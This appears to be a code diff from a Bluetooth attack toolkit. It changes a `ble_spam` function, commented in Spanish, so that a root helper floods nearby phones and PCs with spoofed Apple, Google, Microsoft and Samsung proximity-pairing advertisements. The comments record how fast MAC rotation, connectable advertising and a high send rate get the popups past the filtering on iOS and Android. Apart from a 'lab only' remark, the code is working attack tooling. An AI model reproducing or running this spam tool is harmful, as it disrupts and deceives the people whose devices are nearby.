@@ -1726,166 +1726,71 @@ def _build_samsung_buds_payload():
 
 
 def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
-    """BLE spam via HCI raw commands (hcitool). Rotamos LE Set Advertising
-    Data cada `period_s` segundos durante `seconds`.
+    """BLE spam de ALTA TASA: delega en ble_adv_fast.py (socket HCI crudo, root)
+    que rota MAC+payload ~40 veces/seg durante `seconds`.
 
-    mode:
-      names   - rota nombres de data/ble_names.txt
-      random  - "Dev-xxxx" aleatorios
-      apple   - data/ble_payloads/apple.txt   (Apple Continuity -> iOS/macOS)
-      google  - data/ble_payloads/google.txt  (Google Fast Pair/Nearby -> Android)
-      microsoft - .../microsoft.txt           (Swift Pair -> Windows 10/11)
-      samsung - .../samsung.txt               (Buds Live-like -> Samsung)
+    mode: names | random | apple (Continuity iOS) | google (Fast Pair Android) |
+    microsoft (Swift Pair Win) | samsung (EasySetup).
 
-    Usamos hcitool HCI raw porque bluez `LeAdvertisingManager1` falla con
-    'org.bluez.Error.Failed' en los chips comunes de la Pi (confirmado el
-    2026-10-29 con BCM43438 onboard y RTL8821CU USB). hcitool va directo al
-    kernel por mgmt sock. SOLO lab."""
+    Por que el helper y no hcitool: el loop viejo hacia fork(hcitool) por comando
+    (~1-2 adverts/seg) y a esa tasa el flood NO dispara los popups de proximity-
+    pairing aunque el payload sea correcto. El socket persistente logra ~280/s
+    (verificado 2026-11-04) — esa es la diferencia con Bruce/Flipper, que rotan
+    rapido con su stack nativo. `period_s` se ignora (lo maneja el helper via
+    rotate_ms). SOLO lab."""
     try:
         _iface_index(iface)
     except ValueError as e:
         return None, str(e)
     seconds = max(2, min(int(seconds or 20), 300))
-    period = max(0.3, float(period_s))
     mode = (mode or "names").lower()
 
     ok, msg = power_on(iface)
     if not ok:
         return None, f"No se pudo encender {iface}: {msg}"
 
-    # LE Set Advertise Enable OFF (limpia estado previo)
-    r = _hci(iface, 0x000A, [0x00])
-    if r is None or r.returncode != 0:
-        return None, "hcitool: no se pudo hablar con el controller (sudoers?)"
-    time.sleep(0.1)
-    # LE Set Advertising Parameters: interval 100ms, CONNECTABLE (ADV_IND), 3 ch.
-    # Conectable (adv_type=0x00) es clave: Google Fast Pair y MS Swift Pair SOLO
-    # disparan el popup con advertising conectable, y los nombres aparecen en la
-    # lista de Bluetooth del telefono. Verificado on-device (2026-10-29): la
-    # trama irradia y otro radio la recibe; antes era 0x03 (no-conectable) -> no
-    # salia popup aunque el advert si estaba al aire.
-    r = _hci(iface, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x00,
-                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
-    if r is None or r.returncode != 0:
-        _hci(iface, 0x000A, [0x00])
-        return None, "hcitool: no pudo configurar el intervalo/canales BLE"
+    # Delegamos en ble_adv_fast.py (socket HCI crudo, root) que rota ~40/s. El
+    # helper corre como root (el socket lo exige) via sudo -n python3.
+    helper = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                          "ble_adv_fast.py")
+    r = _run([SUDO, '-n', '/usr/bin/python3', helper, iface, str(seconds), mode],
+             timeout=seconds + 20)
+    out = (r.stdout or '').strip() if r else ''
+    if r is None:
+        err = "ble_adv_fast: sin respuesta (timeout)"
+        log_bt_attack("ble_spam", "", "fail",
+                      details=f"iface={iface} mode={mode} {err}")
+        return {"iface": iface, "mode": mode, "seconds": seconds,
+                "cycles": 0, "rate": 0, "uniq_names": 0, "last_name": "",
+                "raw": ""}, err
 
-    # Pool de payloads segun modo.
-    if mode in ("apple", "google", "microsoft", "samsung"):
-        pool = _load_payloads(mode)
-        if not pool:
-            # Fallback a names si falta el archivo.
-            pool = [{"name": n, "cid": None, "data": b''}
-                    for n in _load_ble_names()]
-            mode = f"{mode}(fallback=names)"
-    elif mode == "random":
-        pool = [{"name": "Dev-%04x" % random.randint(0, 0xFFFF),
-                 "cid": None, "data": b''} for _ in range(32)]
-    else:
-        pool = [{"name": n, "cid": None, "data": b''}
-                for n in _load_ble_names()]
+    data = None
+    for line in reversed(out.splitlines()):
+        line = line.strip()
+        if line.startswith('{') and line.endswith('}'):
+            try:
+                data = json.loads(line); break
+            except Exception:
+                pass
+    if data is None:
+        err = ("ble_adv_fast no devolvio JSON (falta sudoers para el helper?): "
+               + ((r.stderr or out)[-160:]))
+        log_bt_attack("ble_spam", "", "fail",
+                      details=f"iface={iface} mode={mode} {err}")
+        return {"iface": iface, "mode": mode, "seconds": seconds,
+                "cycles": 0, "rate": 0, "uniq_names": 0, "last_name": "",
+                "raw": out[-200:]}, err
 
-    # Mapa mode -> constructor nativo (payload Bruce-compatible, con MAC
-    # random rotada en cada iteracion). Los modos "names"/"random" caen al
-    # flujo generico que usa pool + _build_adv_payload (MAC public, sin rotar).
-    OS_BUILDERS = {
-        "apple":     _build_apple_payload,
-        "google":    _build_google_payload,
-        "microsoft": _build_microsoft_payload,
-        "samsung":   _build_samsung_buds_payload,
-    }
-    builder = None
-    for key in OS_BUILDERS:
-        if mode.startswith(key):
-            builder = OS_BUILDERS[key]; break
-
-    # Para los modos OS-specific aceleramos el periodo (default 1s se baja a
-    # ~0.5s = 2 popups/s) para que los teléfonos cercanos vean varios devices.
-    if builder is not None and period >= 0.9:
-        period = 0.5
-
-    cycles = 0
-    failed_commands = 0
-    last_bad_status = None   # ultimo status HCI != 0x00 (el que explica el fallo)
-    uniq_names = set()
-    last_name = ""
-    t_end = time.time() + seconds
-    while time.time() < t_end:
-        if builder is not None:
-            # Rotamos MAC random + own_addr_type=0x01 en cada ciclo para que el
-            # teléfono vea un "device nuevo" cada vez (si usamos la misma MAC
-            # pública, Android/iOS filtran y no sale popup).
-            payload = builder()
-            n = f"{mode}-{cycles}"
-            ok_dis, _      = _hci_ok(_hci(iface, 0x000A, [0x00]))
-            ok_addr, _     = _hci_ok(_hci(iface, 0x0005, _random_static_address()))
-            ok_par, st_par = _hci_ok(_hci(iface, 0x0006, [
-                0xA0, 0x00, 0xA0, 0x00, 0x00, 0x01,   # adv_type=0x00 CONNECTABLE
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00,
-            ]))
-            if not (ok_dis and ok_addr and ok_par):
-                failed_commands += 1
-                if st_par not in (None, 0x00):
-                    last_bad_status = st_par
-                time.sleep(period)
-                continue
-        else:
-            item = random.choice(pool)
-            payload = _build_adv_payload(item)
-            n = item.get("name", "")
-            # Desactivar antes de re-habilitar: un `LE Set Advertise Enable` sobre
-            # un advertising YA activo devuelve 0x0C (command disallowed). El path
-            # OS ya desactiva al inicio del ciclo; el generico no lo hacia, asi
-            # que solo el 1er ciclo "enganchaba" y el resto se contaba como fallo.
-            _hci(iface, 0x000A, [0x00])
-        if not payload:
-            continue
-        padded = payload + bytes(31 - len(payload))
-        ok_data, st_data = _hci_ok(_hci(iface, 0x0008, [len(payload)] + list(padded)))
-        ok_en,   st_en   = _hci_ok(_hci(iface, 0x000A, [0x01]))
-        if not (ok_data and ok_en):
-            failed_commands += 1
-            # El enable (0x000A) es el que pone el advert al aire: su status es
-            # el mas informativo (p.ej. 0x0C = bluetoothd tiene el advertising).
-            for st in (st_en, st_data):
-                if st not in (None, 0x00):
-                    last_bad_status = st
-                    break
-            time.sleep(period)
-            continue
-        cycles += 1
-        if n:
-            uniq_names.add(n); last_name = n
-        time.sleep(period)
-
-    # Teardown
-    _hci(iface, 0x000A, [0x00])
-
-    status_name = (_HCI_STATUS_NAMES.get(last_bad_status)
-                   if last_bad_status is not None else None)
+    cycles = int(data.get("cycles", 0) or 0)
+    rate = data.get("rate", 0)
+    err = data.get("error")
     log_bt_attack("ble_spam", "", "ok" if cycles > 0 else "fail",
                   details=f"iface={iface} mode={mode} seconds={seconds} "
-                          f"cycles={cycles} uniq={len(uniq_names)} "
-                          f"last={last_name} failed_commands={failed_commands} "
-                          f"hci_status={_hci_describe(last_bad_status).strip()}")
-    err = None
-    if failed_commands:
-        if last_bad_status == 0x0C:
-            hint = (" — el controller rechaza el advertising (command "
-                    "disallowed): bluetoothd probablemente lo tiene tomado. "
-                    "Para 'sudo systemctl stop bluetooth' o usa el onboard hci0.")
-        elif last_bad_status in (0x11, 0x12):
-            hint = (" — el controller no soporta estos parametros de "
-                    "advertising (prueba el onboard hci0).")
-        else:
-            hint = " — comprueba sudoers/rfkill/controller"
-        err = (f"hcitool: {failed_commands} orden(es) HCI rechazadas"
-               f"{_hci_describe(last_bad_status)}{hint}")
+                          f"cycles={cycles} rate={rate}/s"
+                          + (f" err={err}" if err else ""))
     return {"iface": iface, "mode": mode, "seconds": seconds,
-            "cycles": cycles, "uniq_names": len(uniq_names),
-            "last_name": last_name, "failed_commands": failed_commands,
-            "hci_status": last_bad_status, "hci_status_name": status_name,
-            "raw": ""}, err
+            "cycles": cycles, "rate": rate, "uniq_names": cycles,
+            "last_name": data.get("last_name", ""), "raw": ""}, err
 
 
 # ---------------------------------------------------------------------------
